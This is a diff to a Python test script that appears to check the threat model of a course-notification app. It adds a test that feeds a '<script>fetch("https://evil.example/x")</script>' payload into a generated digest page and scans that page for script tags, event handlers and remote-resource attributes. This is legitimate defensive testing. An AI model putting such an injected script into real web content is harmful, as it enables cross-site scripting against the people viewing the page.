@@ -58,8 +58,30 @@ for path in (ROOT / "app" / "fixtures" / "telemetry").glob("*.json"):
         leaky.append(path.name)
 check("TM09", "telemetry carries hashed handles only", not leaky, ", ".join(leaky[:3]))
 check("TM10", "notification caps enforced", dec("cr-learner-capday")["action"] == "NO_CHANGE" and dec("cr-learner-capweek")["action"] == "NO_CHANGE")
-sinks = [str(p.relative_to(ROOT)) for p in (ROOT / "app").rglob("*.html")]
-check("TM11", "no unsafe HTML sinks (console not yet built)", not sinks, "static check until the console lands")
+# TM11 — the console now exists, so it is tested as a surface: no scripts, no remote resources,
+# and hostile content that reaches a receipt must be escaped, not rendered.
+import importlib.util  # noqa: E402
+import shutil  # noqa: E402
+tm_console = ROOT / "app" / "out" / "tm11-console"
+if tm_console.exists():
+    shutil.rmtree(tm_console)
+shutil.copytree(ROOT / "course", tm_console / "course")
+_spec = importlib.util.spec_from_file_location("twin_for_tm11", ROOT / "app" / "run_walking_skeleton.py")
+_twin = importlib.util.module_from_spec(_spec)
+_spec.loader.exec_module(_twin)
+_tree = _twin.Tree(tm_console / "course", tm_console / "app" / "out", mode="sim")
+_events = _twin.load_events()
+_honest = [e for e in _events if e["event_id"] == "cr-n8n-rename-01"]
+_hostile = json.loads(json.dumps(next(e for e in _events if e["event_id"] == "cr-hostile-page-01")))
+_hostile["summary"] = '<script>fetch("https://evil.example/x")</script>'
+_twin.run(_tree, _honest + [_hostile], label="tm11")
+_page = (_tree.out / "digest.html").read_text()
+# a URL inside escaped text is harmless; a URL in an attribute or a script is not
+import re as _re  # noqa: E402
+unsafe = [marker for marker in ("<script", "onerror=", "onload=", "javascript:", "<img", "<iframe")
+          if marker in _page] + _re.findall(r'\b(?:src|href)\s*=', _page)
+check("TM11", "the console has no scripts, no remote resources, and escapes hostile text",
+      not unsafe and "&lt;script&gt;" in _page, f"found={unsafe}")
 check("TM12", "secret shapes are detected", looks_like_secret("token=abcdef123456") and not looks_like_secret("the token budget is 60k"))
 check("TM13", "budget exhaustion escalates", "over_budget" in dec("cr-budget-pubs")["reason_codes"])
 proc = subprocess.run([sys.executable, str(ROOT / "app" / "run_walking_skeleton.py"), "--resume", "--token", "wrong"],
@@ -72,6 +94,7 @@ spec = importlib.util.spec_from_file_location("twin", ROOT / "app" / "run_walkin
 twin = importlib.util.module_from_spec(spec)
 spec.loader.exec_module(twin)
 tmp = ROOT / "app" / "out" / "tm-chain-test"
+import importlib.util  # noqa: E402
 import shutil  # noqa: E402
 if tmp.exists():
     shutil.rmtree(tmp)
